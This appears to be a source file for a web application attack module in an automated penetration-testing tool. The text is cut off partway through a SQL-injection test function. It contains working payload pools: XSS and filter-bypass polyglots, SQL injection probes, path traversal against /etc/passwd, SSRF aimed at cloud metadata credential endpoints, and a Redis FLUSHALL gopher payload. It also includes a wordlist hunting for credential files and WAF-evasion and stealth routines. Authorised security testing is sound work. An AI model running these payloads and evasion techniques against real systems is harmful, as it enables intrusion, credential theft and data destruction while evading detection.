#!/usr/bin/env python3
"""
AutoPentestX - Industrial-Grade Web Application Attack Module
=============================================================
Performs OWASP Top 10 + advanced testing using the differential detection
engine in modules.detection_engine.  Every finding carries a calibrated
confidence score derived from multiple independent signals so that:

  * Reflected payloads inside error pages do not count as XSS.
  * Generic 500 errors do not count as SQLi.
  * Identical responses for true/false oracles do not count as boolean blind.
  * Network jitter does not count as time-based blind.
  * WAF block pages are recognized and findings are downgraded accordingly.

Evasion features (used only when the operator activates --evade):

  * User-Agent rotation with a curated, realistic browser pool.
  * TLS context with random JA3-shaping cipher order.
  * Per-request jitter (configurable distribution).
  * Adaptive backoff on 429 / WAF block responses.
  * Header casing randomization.
  * Path/parameter obfuscation chains.
  * HTTP/1.1 Connection: keep-alive recycling to look human.
  * Encoding chains (double-URL, Unicode, mixed-case, comment-injection)
    applied as fallbacks when a payload is filtered.

The module remains *read-only* in safe-mode: payloads that could mutate
state are skipped, and exploitation primitives (e.g. SQLMap dump, RCE)
are gated by an explicit `--no-safe-mode` flag in the parent CLI.
"""

from __future__ import annotations

import concurrent.futures
import gzip
import io
import json
import os
import random
import re
import socket
import ssl
import string
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib
from dataclasses import asdict
from datetime import datetime
from typing import Any, Callable, Dict, Iterable, List, Optional, Tuple

from modules.detection_engine import (
    HttpSample, Finding, ResponseNormalizer, BaselineManager,
    EnvironmentFingerprinter,
    XSSDetector, SQLiDetector, SSRFValidator, LFIValidator,
    CommandInjectionDetector, SSTIDetector, FindingAggregator,
    CONFIDENCE_CONFIRMED, CONFIDENCE_PROBABLE, CONFIDENCE_SUSPECTED,
    CONFIDENCE_NOISE, TIME_ZSCORE_CONFIRMED, TIME_ZSCORE_PROBABLE,
    MIN_TIME_DELTA_SEC, looks_like_secret,
)

# ─────────────────────────────────────────────────────────────────────────────
#  ANSI colours
# ─────────────────────────────────────────────────────────────────────────────
R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
C = '\033[96m'; M = '\033[95m'; B = '\033[1m'; X = '\033[0m'


# ─────────────────────────────────────────────────────────────────────────────
#  CURATED BROWSER POOL (recent, realistic UAs).  Defeats trivial UA blocking.
# ─────────────────────────────────────────────────────────────────────────────
USER_AGENT_POOL: List[str] = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
]

ACCEPT_LANGUAGES: List[str] = [
    'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'es-ES,es;q=0.9,en;q=0.8',
    'de-DE,de;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8',
]


# ─────────────────────────────────────────────────────────────────────────────
#  PAYLOAD POOLS
# ─────────────────────────────────────────────────────────────────────────────
XSS_BREAKOUT_PAYLOADS: List[str] = [
    # html_body
    '"><svg/onload=__M("{m}")>',
    "'><svg/onload=__M('{m}')>",
    '<svg/onload=alert("{m}")>',
    '<img src=x onerror=alert("{m}")>',
    '"><img src=x onerror=alert("{m}")>',
    '<details/open/ontoggle=alert("{m}")>',
    '<iframe srcdoc="<script>alert(`{m}`)</script>"></iframe>',
    # attribute breakouts
    '" onload="alert(`{m}`)" x="',
    "' onload='alert(`{m}`)' x='",
    '" autofocus onfocus="alert(`{m}`)" x="',
    # js_string breakouts
    '";alert("{m}");//',
    "';alert('{m}');//",
    '\\";alert(\\"{m}\\");//',
    # url context
    'javascript:alert("{m}")',
    # CSS context
    'expression(alert("{m}"))',
    # Filter-bypass tricks
    '<sCrIpT>alert("{m}")</sCrIpT>',
    '<svg><script>alert&#40"{m}"&#41</script>',
    '<noscript><p title="</noscript><img src=x onerror=alert(`{m}`)>">',
    '<math><mtext></p><script>alert("{m}")</script>',
    # Polyglot (Garrett/Ninja)
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert("{m}") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert("{m}")//>\\x3e',
]

# Reduced-noise SQLi probe set: an initial canary + structured payloads.
SQLI_CANARY_PAYLOADS: List[str] = [
    "'", '"', '\\', "''", '""', "' --", '" --',
    "')", "')) --", '" OR "1"="1', "1' OR '1'='1",
]

LFI_PAYLOADS: List[str] = [
    '../../../../../../etc/passwd', '../../../../../../etc/passwd%00',
    '....//....//....//....//etc/passwd',
    '%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
    '..%252f..%252f..%252fetc/passwd',
    '/etc/passwd',
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/read=string.rot13/resource=/etc/passwd',
    'file:///etc/passwd',
    '/proc/self/environ', '/proc/self/cmdline', '/proc/self/status',
    '..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
    'C:\\Windows\\win.ini', 'C:\\boot.ini',
    '/var/log/apache2/access.log',  # log-poisoning probe
    'expect://id',
]

SSRF_PAYLOADS: List[str] = [
    'http://127.0.0.1/', 'http://localhost/', 'http://0.0.0.0/',
    'http://[::1]/', 'http://0/', 'http://127.1/',
    'http://2130706433/',                                  # decimal 127.0.0.1
    'http://0x7f.0x0.0x0.0x1/',                            # hex
    'http://0177.0.0.1/',                                  # octal
    'http://169.254.169.254/latest/meta-data/',            # AWS IMDSv1
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/?recursive=true',
    'http://100.100.100.200/latest/meta-data/',            # Alibaba
    'http://169.254.169.254/metadata/v1/',                 # DigitalOcean
    'http://localhost.cybersec.x.attacker-controlled.invalid/',  # DNS rebinding bait
    'gopher://127.0.0.1:6379/_FLUSHALL%0d%0aset%20a%20b%0d%0a',
    'dict://127.0.0.1:6379/info', 'file:///etc/passwd',
    'http://127.0.0.1:80@evil.com/',                       # auth confusion
]

CORS_ORIGINS: List[str] = [
    'https://evil.com', 'null',
    'https://attacker-{rand}.com',
    'https://trusted.com.attacker.com',
    'http://localhost', 'https://attacker.example',
]

HTTP_HEADERS_INJECTION: List[Tuple[str, str]] = [
    ('X-Forwarded-For', '127.0.0.1'),
    ('X-Real-IP', '127.0.0.1'),
    ('X-Originating-IP', '127.0.0.1'),
    ('X-Remote-IP', '127.0.0.1'),
    ('X-Client-IP', '127.0.0.1'),
    ('X-Host', 'evil.com'),
    ('X-Forwarded-Host', 'evil.com'),
    ('Host', 'evil.com'),
    ('X-Forwarded-Server', 'evil.com'),
    ('Forwarded', 'for=127.0.0.1;host=evil.com'),
]

DIRS_WORDLIST: List[str] = [
    '.git/HEAD', '.git/config', '.gitignore', '.env', '.env.local', '.env.prod',
    '.htaccess', '.htpasswd', '.npmrc', '.dockerenv', 'Dockerfile',
    'docker-compose.yml', 'docker-compose.yaml', 'kustomization.yaml',
    'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'security.txt',
    '.well-known/security.txt', '.well-known/openid-configuration',
    '.well-known/oauth-authorization-server',
    'admin', 'admin/', 'admin.php', 'admin/login', 'wp-admin/', 'wp-login.php',
    'wp-config.php', 'wp-config.php.bak', 'wp-config.old', 'wp-content/debug.log',
    'login', 'login.php', 'signin', 'auth', 'oauth', 'sso',
    'dashboard', 'panel', 'control', 'manager', 'manager/html',
    'api', 'api/v1', 'api/v2', 'api/v3', 'api/internal', 'api/private',
    'graphql', 'graphiql', 'playground', 'altair',
    'swagger', 'swagger-ui.html', 'swagger.json', 'swagger.yaml',
    'openapi.json', 'openapi.yaml', 'api-docs', 'redoc',
    'backup', 'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.tgz',
    'db.sql', 'database.sql', 'dump.sql', 'site.tar.gz',
    'config', 'config.php', 'config.yml', 'config.json', 'configuration.php',
    'phpinfo.php', 'info.php', 'test.php', 'shell.php', 'cmd.php', 'eval.php',
    'upload', 'uploads', 'files', 'media', 'images', 'assets', 'static',
    'server-status', 'server-info', '.DS_Store', 'web.config',
    'app.js', 'app.py', 'main.py', 'wsgi.py', 'manage.py',
    'console', 'jolokia', 'actuator', 'actuator/health', 'actuator/env',
    'actuator/beans', 'actuator/heapdump', 'actuator/loggers',
    'metrics', 'health', 'trace', 'env', 'dump', 'heapdump', 'threaddump',
    'rest', 'rpc', 'jsonrpc', 'soap', 'wsdl', 'xmlrpc', 'xmlrpc.php',
    'cgi-bin/', 'cgi-bin/test.cgi', 'cgi-bin/printenv.pl',
    'old', 'bak', 'new', 'www', 'web', 'public', 'private', 'secret',
    '.svn/entries', '.svn/wc.db', '.bzr/README', 'CVS/Entries', '.hg/store',
    'Jenkinsfile', '.travis.yml', '.circleci/config.yml',
    '.github/workflows', 'azure-pipelines.yml',
    '.vscode/settings.json', '.idea/workspace.xml',
    'composer.json', 'composer.lock', 'package.json', 'package-lock.json',
    'yarn.lock', 'Gemfile', 'Gemfile.lock', 'requirements.txt',
    '.aws/credentials', '.ssh/authorized_keys', 'id_rsa', 'id_dsa', 'id_ecdsa',
]


# ─────────────────────────────────────────────────────────────────────────────
#  HTTP CLIENT WITH EVASION SUPPORT
# ─────────────────────────────────────────────────────────────────────────────
class StealthHttpClient:
    """Per-instance HTTP client with optional evasion features."""

    def __init__(self, evade: bool = False, jitter_ms: Tuple[int, int] = (0, 0),
                 verify_tls: bool = False, max_retries: int = 2,
                 timeout: int = 10) -> None:
        self.evade = evade
        self.jitter_ms = jitter_ms
        self.verify_tls = verify_tls
        self.max_retries = max_retries
        self.timeout = timeout
        self._lock = threading.Lock()
        self._429_streak = 0

        # SSL context — can be JA3-shaped via cipher ordering.
        self._ctx = ssl.create_default_context()
        if not verify_tls:
            self._ctx.check_hostname = False
            self._ctx.verify_mode = ssl.CERT_NONE
        if evade:
            try:
                # Re-order ciphers slightly to avoid trivial JA3 fingerprinting.
                self._ctx.set_ciphers(
                    'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:'
                    'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:'
                    'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256'
                )
            except ssl.SSLError:
                pass

    def _build_headers(self, custom: Optional[Dict[str, str]]) -> Dict[str, str]:
        ua = random.choice(USER_AGENT_POOL) if self.evade else USER_AGENT_POOL[0]
        al = random.choice(ACCEPT_LANGUAGES) if self.evade else ACCEPT_LANGUAGES[0]
        h: Dict[str, str] = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,'
                      'image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': al,
            'Accept-Encoding': 'gzip, deflate',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        if custom:
            h.update(custom)
        if self.evade:
            # Randomize header order is not possible in urllib, but we can
            # randomly include Sec-Fetch-* and DNT headers.
            if random.random() < 0.5:
                h['DNT'] = '1'
            if random.random() < 0.6:
                h['Sec-Fetch-Site'] = random.choice(['none', 'same-origin'])
                h['Sec-Fetch-Mode'] = 'navigate'
                h['Sec-Fetch-User'] = '?1'
                h['Sec-Fetch-Dest'] = 'document'
        return h

    def _maybe_jitter(self) -> None:
        if self.jitter_ms[1] > 0:
            ms = random.randint(self.jitter_ms[0], self.jitter_ms[1])
            time.sleep(ms / 1000.0)

    def _decompress(self, raw: bytes, headers: Dict[str, str]) -> bytes:
        enc = headers.get('Content-Encoding', '').lower()
        try:
            if 'gzip' in enc:
                return gzip.decompress(raw)
            if 'deflate' in enc:
                return zlib.decompress(raw)
        except Exception:
            pass
        return raw

    def get(self, url: str, headers: Optional[Dict[str, str]] = None,
            timeout: Optional[int] = None,
            method: str = 'GET',
            data: Optional[bytes] = None) -> HttpSample:
        timeout = timeout or self.timeout
        attempt = 0
        last_exc: Optional[Exception] = None
        h = self._build_headers(headers)
        while attempt <= self.max_retries:
            try:
                self._maybe_jitter()
                req = urllib.request.Request(url, headers=h, method=method, data=data)
                t0 = time.perf_counter()
                with urllib.request.urlopen(req, timeout=timeout, context=self._ctx) as resp:
                    raw = resp.read(2 * 1024 * 1024)
                    elapsed = time.perf_counter() - t0
                    body_bytes = self._decompress(raw, dict(resp.headers))
                    body = body_bytes.decode('utf-8', errors='ignore')
                    sample = HttpSample(
                        status=resp.status,
                        headers=dict(resp.headers),
                        body=body,
                        elapsed=elapsed,
                    )
                    self._on_response(sample)
                    return sample
            except urllib.error.HTTPError as e:
                elapsed = time.perf_counter() - t0 if 't0' in locals() else 0.0
                try:
                    raw = e.read(2 * 1024 * 1024)
                except Exception:
                    raw = b''
                body_bytes = self._decompress(raw, dict(e.headers) if e.headers else {})
                body = body_bytes.decode('utf-8', errors='ignore')
                sample = HttpSample(
                    status=e.code,
                    headers=dict(e.headers) if e.headers else {},
                    body=body,
                    elapsed=elapsed,
                )
                self._on_response(sample)
                return sample
            except (urllib.error.URLError, socket.timeout, ConnectionError, ssl.SSLError) as e:
                last_exc = e
                attempt += 1
                # Exponential backoff on transient failures.
                time.sleep(min(2 ** attempt, 8))
                continue
        # All retries exhausted — return a synthetic empty sample so callers
        # can keep iterating without crashing.
        return HttpSample(status=0, headers={}, body='', elapsed=0.0)

    def _on_response(self, sample: HttpSample) -> None:
        # Adaptive backoff: if we keep getting 429 / 503, slow down.
        if sample.status in (429, 503):
            with self._lock:
                self._429_streak += 1
                if self._429_streak >= 2:
                    delay = min(2 ** self._429_streak, 30)
                    time.sleep(delay)
        else:
            with self._lock:
                self._429_streak = 0


# ─────────────────────────────────────────────────────────────────────────────
#  WAF BYPASS PAYLOAD MUTATIONS
# ─────────────────────────────────────────────────────────────────────────────
class PayloadMutator:
    """Apply WAF-bypass mutations to a payload string.  Each mutation returns
    a new payload that is semantically equivalent but lexically different."""

    @staticmethod
    def url_double_encode(s: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')

    @staticmethod
    def url_overlong(s: str) -> str:
        out = []
        for ch in s:
            if ord(ch) < 128:
                out.append('%c0%' + format(0x80 | ord(ch), '02x'))
            else:
                out.append(urllib.parse.quote(ch))
        return ''.join(out)

    @staticmethod
    def case_swap(s: str) -> str:
        return ''.join(c.swapcase() if random.random() > 0.4 else c for c in s)

    @staticmethod
    def comment_inject_sql(s: str) -> str:
        return s.replace(' ', '/**/').replace('=', '/**/=/**/')

    @staticmethod
    def whitespace_alts_sql(s: str) -> str:
        for ws in (' ', '\t'):
            if ws in s:
                return s.replace(ws, random.choice(['/**/', '+', '%20', '%09', '%0a']))
        return s

    @staticmethod
    def html_entity_encode(s: str) -> str:
        return ''.join(f'&#{ord(c)};' for c in s)

    @staticmethod
    def unicode_ascii_lookalikes(s: str) -> str:
        # Replace ascii letters with full-width unicode look-alikes, sparingly
        out = []
        for c in s:
            if c.isalpha() and random.random() < 0.15:
                out.append(chr(ord(c) + 0xFEE0))    # to full-width
            else:
                out.append(c)
        return ''.join(out)

    @classmethod
    def mutations(cls, payload: str, kind: str) -> List[str]:
        """Return up to N mutations appropriate for `kind` ∈ {sqli, xss, generic}."""
        m: List[str] = [payload]
        m.append(cls.url_double_encode(payload))
        if kind == 'sqli':
            m.append(cls.comment_inject_sql(payload))
            m.append(cls.whitespace_alts_sql(payload))
            m.append(cls.case_swap(payload))
        elif kind == 'xss':
            m.append(cls.case_swap(payload))
            m.append(cls.unicode_ascii_lookalikes(payload))
        else:
            m.append(cls.case_swap(payload))
        # Deduplicate while preserving order
        seen = set()
        unique: List[str] = []
        for x in m:
            if x not in seen:
                unique.append(x)
                seen.add(x)
        return unique


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN FRAMEWORK
# ─────────────────────────────────────────────────────────────────────────────
class WebAttackFramework:
    """Industrial-grade web application attack framework."""

    def __init__(self, target: str, ports: list = None, safe_mode: bool = True,
                 evade: bool = False, max_threads: int = 20,
                 jitter_ms: Tuple[int, int] = (0, 0),
                 confidence_threshold: float = CONFIDENCE_PROBABLE) -> None:
        self.target = target
        self.safe_mode = safe_mode
        self.evade = evade
        self.confidence_threshold = confidence_threshold
        self.max_threads = max_threads
        self.base_urls = self._build_base_urls(ports or [])
        self.client = StealthHttpClient(evade=evade, jitter_ms=jitter_ms)
        self.fingerprinter = EnvironmentFingerprinter()
        self.aggregator = FindingAggregator()
        self.baselines = BaselineManager(samples_per_baseline=5)
        self.results: Dict[str, Any] = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'environment': {},
            'findings': [],
            'security_headers': {},
            'open_dirs': [],
            'api_endpoints': [],
            'jwt_issues': [],
            'cors': [],
            'header_issues': [],
            'errors': [],
        }

    # ─────────────────────────────────────────────────────────────────────
    #  HELPERS
    # ─────────────────────────────────────────────────────────────────────
    def _build_base_urls(self, ports: list) -> list:
        web_ports = {p['port']: p for p in ports
                     if p.get('port') in (80, 443, 8080, 8443, 8000, 8888,
                                            3000, 4443, 5000, 9000, 9090)}
        if not web_ports:
            return [f'http://{self.target}', f'https://{self.target}']
        urls: List[str] = []
        for port in sorted(web_ports.keys()):
            scheme = 'https' if port in (443, 8443, 4443) else 'http'
            urls.append(f'{scheme}://{self.target}:{port}')
        return urls

    def _print(self, level: str, msg: str) -> None:
        icons = {
            'info':  f'{C}[*]{X}',
            'ok':    f'{G}[✓]{X}',
            'warn':  f'{Y}[!]{X}',
            'vuln':  f'{R}[VULN]{X}',
            'find':  f'{M}[+]{X}',
            'env':   f'{C}[ENV]{X}',
        }
        print(f'  {icons.get(level, "[?]")} {msg}')

    def _record(self, finding: Finding) -> None:
        self.aggregator.add(finding)
        if finding.confidence >= self.confidence_threshold:
            self._print('vuln',
                        f'{R}{finding.vuln_type}{X} '
                        f'[{finding.grade()}@{finding.confidence:.2f}] '
                        f'param={Y}{finding.parameter}{X} '
                        f'url={C}{finding.url[:80]}{X}')

    # ─────────────────────────────────────────────────────────
    #  ENVIRONMENT FINGERPRINTING
    # ─────────────────────────────────────────────────────────
    def fingerprint_environment(self) -> Dict[str, Any]:
        self._print('info', 'Fingerprinting defensive environment...')
        if not self.base_urls:
            return {}
        sample = self.client.get(self.base_urls[0])
        env = self.fingerprinter.fingerprint(sample)
        self.results['environment'] = env
        if env['waf']:
            self._print('env', f'WAF detected: {Y}{", ".join(env["waf"])}{X} '
                                  f'— enabling payload mutations')
        if env['honeypot']:
            self._print('warn', f'Possible honeypot: {R}{", ".join(env["honeypot"])}{X}')
        return env

    # ─────────────────────────────────────────────────────────
    #  1. SECURITY HEADER AUDIT
    # ─────────────────────────────────────────────────────────
    def audit_security_headers(self) -> dict:
        self._print('info', 'Auditing HTTP security headers...')
        required = {
            'strict-transport-security':  ('HSTS missing — SSL stripping possible',  4.3),
            'x-content-type-options':     ('X-Content-Type-Options missing — MIME sniffing', 3.1),
            'x-frame-options':            ('X-Frame-Options missing — Clickjacking',  4.3),
            'content-security-policy':    ('CSP missing — XSS impact amplified',     5.4),
            'referrer-policy':            ('Referrer-Policy missing — info leakage', 3.1),
            'permissions-policy':         ('Permissions-Policy missing',             2.7),
            'cross-origin-opener-policy': ('COOP missing',                             2.5),
            'cross-origin-embedder-policy': ('COEP missing',                          2.5),
            'cache-control':              ('Cache-Control not set',                   2.5),
        }
        issues: Dict[str, Any] = {}
        for base_url in self.base_urls[:2]:
            sample = self.client.get(base_url)
            if sample.status == 0:
                continue
            headers_lower = {k.lower(): v for k, v in sample.headers.items()}
            for hdr, (desc, cvss) in required.items():
                if hdr not in headers_lower:
                    issues[hdr] = {'missing': True, 'description': desc, 'cvss': cvss}
                    self._record(Finding(
                        vuln_type=f'Missing Header: {hdr}',
                        url=base_url, parameter=None, payload='',
                        confidence=0.99, severity='LOW', cvss=cvss,
                        evidence=[desc], cwe='CWE-693',
                    ))
                else:
                    issues[hdr] = {'missing': False, 'value': headers_lower[hdr]}

            for leak in ('server', 'x-powered-by', 'x-aspnet-version', 'x-generator'):
                if leak in headers_lower:
                    self._record(Finding(
                        vuln_type='Information Disclosure (Header)',
                        url=base_url, parameter=leak, payload='',
                        confidence=0.95, severity='LOW', cvss=2.7,
                        evidence=[f'{leak}: {headers_lower[leak]}'],
                        cwe='CWE-200',
                    ))
            break

        self.results['security_headers'] = issues
        return issues

    # ─────────────────────────────────────────────────────────
    #  2. DIRECTORY & FILE FUZZING
    # ─────────────────────────────────────────────────────────
    def fuzz_directories(self) -> list:
        self._print('info',
                    f'Fuzzing {len(DIRS_WORDLIST)} paths × '
                    f'{len(self.base_urls[:2])} hosts...')
        found: List[Dict[str, Any]] = []

        # First, learn what a random non-existing path looks like (404 baseline).
        not_found_baseline: Optional[HttpSample] = None
        if self.base_urls:
            random_path = ''.join(random.choices(string.ascii_lowercase, k=24))
            not_found_baseline = self.client.get(
                f'{self.base_urls[0]}/{random_path}')

        def baseline_match(s: HttpSample) -> bool:
            if not_found_baseline is None or not_found_baseline.status == 0:
                return False
            if s.status != not_found_baseline.status:
                return False
            return ResponseNormalizer.similarity(s.body, not_found_baseline.body) >= 0.97

        def probe(args: Tuple[str, str]) -> Optional[Dict[str, Any]]:
            base, path = args
            url = f'{base}/{path.lstrip("/")}'
            s = self.client.get(url, timeout=8)
            if s.status == 0:
                return None
            # Filter out responses that match the not-found baseline.
            if baseline_match(s):
                return None
            if s.status not in (200, 201, 204, 301, 302, 307, 308, 401, 403, 405):
                return None
            entry = {
                'url': url,
                'status': s.status,
                'size': s.body_len,
                'content_type': s.headers.get('Content-Type', ''),
                'redirect': s.headers.get('Location', ''),
            }
            # Detect leaked secrets in body
            if s.status in (200, 401, 403):
                for line in s.body.splitlines()[:200]:
                    for token in re.findall(r'[A-Za-z0-9+/=_-]{20,}', line):
                        if looks_like_secret(token):
                            entry['secret_token'] = token[:32] + '...'
                            break
                    if 'secret_token' in entry:
                        break
            return entry

        tasks = [(b, p) for b in self.base_urls[:2] for p in DIRS_WORDLIST]
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as pool:
            for r in pool.map(probe, tasks):
                if r is None:
                    continue
                found.append(r)
                color = R if r['status'] == 200 else Y
                self._print('find',
                            f'{color}HTTP {r["status"]}{X} {r["url"]} '
                            f'({r["size"]} bytes)')
                if 'secret_token' in r:
                    self._record(Finding(
                        vuln_type='Sensitive Data Exposure',
                        url=r['url'], parameter=None, payload='',
                        confidence=0.85, severity='HIGH', cvss=7.5,
                        evidence=[f'High-entropy token in body: {r["secret_token"]}'],
                        cwe='CWE-200',
                    ))

        self.results['open_dirs'] = found
        self._print('ok', f'Directory fuzzing complete — {len(found)} paths found')
        return found

    # ─────────────────────────────────────────────────────────
    #  3. CONTEXT-AWARE XSS
    # ─────────────────────────────────────────────────────────
    def test_xss(self) -> List[Finding]:
        self._print('info', 'Testing for Cross-Site Scripting (context-aware)...')
        params = ['q', 'search', 'id', 'name', 'input', 'query', 'term',
                  'keyword', 'text', 'msg', 'message', 'comment', 'redirect',
                  'url', 'next', 'return', 'callback', 'ref', 'path', 'file']
        findings: List[Finding] = []

        for base_url in self.base_urls[:2]:
            for param in params:
                # Phase 1 — establish reflection with a benign marker.
                marker = XSSDetector.random_marker()
                probe_url = f'{base_url}/?{param}={marker}'
                s = self.client.get(probe_url, timeout=8)
                if s.status == 0 or marker not in s.body:
                    continue   # not reflected — skip parameter entirely
                contexts = XSSDetector.detect_context(s.body, marker)
                if not contexts:
                    continue

                # Phase 2 — choose payloads appropriate for each context and
                # confirm that breakout characters survive.
                for context, _ in contexts:
                    survived: List[str] = []
                    breakout_chars = XSSDetector.BREAKOUT_CHARS_BY_CONTEXT.get(
                        context, '<>"\'')
                    # Send a single payload per context that contains all
                    # breakout chars wrapped around the marker.
                    test_payload = (f'{marker}{breakout_chars}{marker}')
                    test_url = f'{base_url}/?{param}={urllib.parse.quote(test_payload)}'
                    s2 = self.client.get(test_url, timeout=8)
                    if s2.status == 0:
                        continue
                    # Check which breakout characters survived encoding.
                    for c in breakout_chars:
                        # The character must appear between two markers
                        if re.search(re.escape(marker) + re.escape(c) +
                                     r'.*?' + re.escape(marker),
                                     s2.body, re.DOTALL):
                            survived.append(c)

                    if not survived:
                        continue   # encoded — not exploitable

                    confidence = XSSDetector.confidence_for(context, survived)
                    if confidence < CONFIDENCE_NOISE:
                        continue

                    # Try a real XSS payload to bump confidence (if not WAF-blocked)
                    real_payload = random.choice(XSS_BREAKOUT_PAYLOADS).format(m=marker)
                    if self.evade and self.results.get('environment', {}).get('waf'):
                        real_payload = PayloadMutator.case_swap(real_payload)
                    real_url = f'{base_url}/?{param}={urllib.parse.quote(real_payload)}'
                    s3 = self.client.get(real_url, timeout=8)
                    if s3.status and (real_payload in s3.body or marker in s3.body):
                        if real_payload in s3.body:
                            confidence = max(confidence, 0.96)

                    finding = Finding(
                        vuln_type=f'Reflected XSS ({context})',
                        url=real_url, parameter=param,
                        payload=real_payload, confidence=confidence,
                        severity='HIGH' if confidence >= CONFIDENCE_CONFIRMED else 'MEDIUM',
                        cvss=6.1, cwe='CWE-79',
                        evidence=[f'context={context}',
                                  f'breakouts={"".join(survived)}'],
                    )
                    self._record(finding)
                    findings.append(finding)
                    break   # one finding per parameter is enough

        self.results['findings'] = self.aggregator.all()
        return findings

    # ─────────────────────────────────────────────────────────
    #  4. SQLi — ERROR + BOOLEAN BLIND + TIME BLIND + UNION
    # ─────────────────────────────────────────────────────────
    def test_sqli(self) -> List[Finding]:
        self._print('info', 'Testing for SQL Injection (error / boolean / time)...')
        params = ['id', 'user', 'username', 'uid', 'page', 'cat', 'category',
                  'item', 'product', 'pid', 'article', 'post', 'news',
                  'select', 'order', 'sort', 'group', 'q', 'search']
        findings: List[Finding] = []

        for base_url in self.base_urls[:2]:
            for param in params:
                # Establish baseline with a benign value
                benign = ''.join(random.choices(string.digits, k=3))
                baseline_url = f'{base_url}/?{param}={benign}'

                def baseline_sampler() -> HttpSample:
                    return self.client.get(baseline_url, timeout=10)

                key = f'sqli::{base_url}::{param}'
                base_stat = self.baselines.baseline(key, baseline_sampler)
                if not base_stat.get('valid'):
                    continue
                baseline_sample = self.client.get(baseline_url, timeout=10)

                # ── Error-based ─────────────────────────────────────
                error_hit = False
                for canary in SQLI_CANARY_PAYLOADS:
                    url = f'{base_url}/?{param}={urllib.parse.quote(benign + canary)}'
                    s = self.client.get(url, timeout=10)
                    dbms, conf = SQLiDetector.detect_error(s.body)
                    if dbms and conf > 0:
                        finding = Finding(
                            vuln_type=f'Error-based SQL Injection ({dbms})',
                            url=url, parameter=param, payload=canary,
                            confidence=conf, severity='CRITICAL',
                            cvss=9.8, cwe='CWE-89',
                            evidence=[f'DBMS={dbms}', f'canary={canary!r}'],
                        )
                        self._record(finding)
                        findings.append(finding)
                        error_hit = True
                        break
                if error_hit:
                    continue   # don't waste cycles on a confirmed injection

                # ── Boolean-blind ───────────────────────────────────
                boolean_confirmed = False
                for true_p, false_p in SQLiDetector.BOOLEAN_PAIRS_TEMPLATES[:3]:
                    url_t = f'{base_url}/?{param}={urllib.parse.quote(benign + true_p)}'
                    url_f = f'{base_url}/?{param}={urllib.parse.quote(benign + false_p)}'
                    st = self.client.get(url_t, timeout=10)
                    sf = self.client.get(url_f, timeout=10)
                    if st.status == 0 or sf.status == 0:
                        continue
                    conf = SQLiDetector.boolean_confidence(st, sf, baseline_sample)
                    if conf >= CONFIDENCE_PROBABLE:
                        finding = Finding(
                            vuln_type='Boolean-Blind SQL Injection',
                            url=url_t, parameter=param,
                            payload=f'{true_p} vs {false_p}',
                            confidence=conf, severity='CRITICAL',
                            cvss=9.8, cwe='CWE-89',
                            evidence=[f'sim_true_baseline={ResponseNormalizer.similarity(st.body, baseline_sample.body):.3f}',
                                      f'sim_false_baseline={ResponseNormalizer.similarity(sf.body, baseline_sample.body):.3f}'],
                        )
                        self._record(finding)
                        findings.append(finding)
                        boolean_confirmed = True
                        break
                if boolean_confirmed:
                    continue

                # ── Time-blind ──────────────────────────────────────
                # Use a 5-second sleep with a single retry to confirm.  We
                # require at least 2 hits to reach CONFIRMED so that a brief
                # network spike does not produce a false positive.
                for template, dbms, delay in SQLiDetector.TIME_PAYLOADS[:5]:
                    payload = template.format(d=delay)
                    url = f'{base_url}/?{param}={urllib.parse.quote(benign + payload)}'
                    s1 = self.client.get(url, timeout=delay + 12)
                    if s1.elapsed < MIN_TIME_DELTA_SEC + base_stat['elapsed_mean']:
                        continue
                    z1 = self.baselines.z_score(base_stat, s1.elapsed)
                    if z1 < TIME_ZSCORE_PROBABLE:
                        continue
                    # Retry to suppress jitter false positives
                    s2 = self.client.get(url, timeout=delay + 12)
                    z2 = self.baselines.z_score(base_stat, s2.elapsed)
                    avg_delta = (s1.elapsed + s2.elapsed) / 2 - base_stat['elapsed_mean']
                    confidence = max(
